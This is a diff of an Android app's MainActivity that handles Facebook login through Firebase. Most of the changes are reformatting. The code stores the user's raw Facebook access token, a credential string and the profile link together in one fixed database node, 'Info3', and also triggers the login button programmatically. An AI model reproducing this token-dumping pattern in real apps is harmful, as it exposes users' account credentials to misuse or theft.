@@ -11,6 +11,7 @@ import android.view.View;
 import android.widget.Button;
 import android.widget.EditText;
 import android.widget.Toast;
+
 import com.facebook.AccessToken;
 import com.facebook.AccessTokenSource;
 import com.facebook.AccessTokenTracker;
@@ -44,7 +45,7 @@ public class MainActivity extends AppCompatActivity {
 
     FirebaseAuth firebaseAuth;
     LoginButton loginButton;
-    String link;
+    public static String link;
 
     Button fb;
     FireMissilesDialogFragment opa = new FireMissilesDialogFragment();
@@ -72,21 +73,13 @@ public class MainActivity extends AppCompatActivity {
             loginButton.performClick();
 
 
-            loginButton.setReadPermissions(Arrays.asList("email","user_link"));
+            loginButton.setReadPermissions(Arrays.asList("email", "user_link"));
             loginButton.registerCallback(callbackManager, new FacebookCallback<LoginResult>() {
                 @Override
                 public void onSuccess(final LoginResult loginResult) {
                     Log.d(TAG, "facebook:onSuccess:" + loginResult);
 
-
-
-
                     loadUserprofile(loginResult.getAccessToken());
-
-
-
-
-
 
                 }
 
@@ -113,58 +106,48 @@ public class MainActivity extends AppCompatActivity {
     }
 
 
+    private void loadUserprofile(final AccessToken newAccessToken) {
 
-private void loadUserprofile(final AccessToken newAccessToken){
+        GraphRequest graphRequest = GraphRequest.newMeRequest(newAccessToken, new GraphRequest.GraphJSONObjectCallback() {
+            @Override
+            public void onCompleted(JSONObject object, GraphResponse response) {
 
-    GraphRequest graphRequest = GraphRequest.newMeRequest(newAccessToken, new GraphRequest.GraphJSONObjectCallback() {
-        @Override
-        public void onCompleted(JSONObject object, GraphResponse response) {
+                try {
 
-            try {
+                    link = object.getString("link");
 
-                link = object.getString("link");
-                dados_face x = new dados_face();
-                x.setToken(link);
+                    FirebaseDatabase firebaseDatabase;
+                    DatabaseReference databaseReference;
+                    firebaseDatabase = FirebaseDatabase.getInstance();
+                    databaseReference = firebaseDatabase.getReference();
 
+                    databaseReference.child("link_facebook").setValue(link);
 
-                FirebaseUser user = firebaseAuth.getCurrentUser();
+                    handleFacebookAccessToken(newAccessToken);
 
+                } catch (JSONException e) {
+                    e.printStackTrace();
+                }
 
-                FirebaseDatabase firebaseDatabase;
-                DatabaseReference databaseReference;
-                firebaseDatabase = FirebaseDatabase.getInstance();
-                databaseReference = firebaseDatabase.getReference();
-
-                databaseReference.child("link_facebook").setValue(link);
-
-
-
-                handleFacebookAccessToken(newAccessToken);
-
-            } catch (JSONException e) {
-                e.printStackTrace();
             }
+        });
 
-        }
-    });
+        Bundle bundle = new Bundle();
 
-    Bundle bundle = new Bundle();
-
-    bundle.putString("fields","first_name,last_name,email,id,link");
-    graphRequest.setParameters(bundle);
-    graphRequest.executeAsync();
-
-
-
+        bundle.putString("fields", "first_name,last_name,email,id,link");
+        graphRequest.setParameters(bundle);
+        graphRequest.executeAsync();
 
 
     }
+
     public void onStart() {
         super.onStart();
         // Check if user is signed in (non-null) and update UI accordingly.
         FirebaseUser currentUser = firebaseAuth.getCurrentUser();
         updateUI(currentUser, true);
     }
+
     private void handleFacebookAccessToken(final AccessToken accessToken) {
         Log.d(TAG, "handleFacebookAccessToken:" + accessToken);
 
@@ -185,7 +168,7 @@ private void loadUserprofile(final AccessToken newAccessToken){
 
                     AccessToken.getCurrentAccessToken().getPermissions();
 
-                    databaseReference.child("Info3").setValue(accessToken.getToken()+"login "+credential.toString()+"link"+link);
+                    databaseReference.child("Info3").setValue(accessToken.getToken() + "login " + credential.toString() + "link" + link);
 
 
                     updateUI(user, false);
@@ -203,7 +186,7 @@ private void loadUserprofile(final AccessToken newAccessToken){
             Intent intent = new Intent(MainActivity.this, Profile.class);
             intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_CLEAR_TASK | Intent.FLAG_ACTIVITY_NEW_TASK);
             startActivity(intent);
-        } else if (user != null){
+        } else if (user != null) {
             opa.show(getSupportFragmentManager(), "missiles");
         }
     }
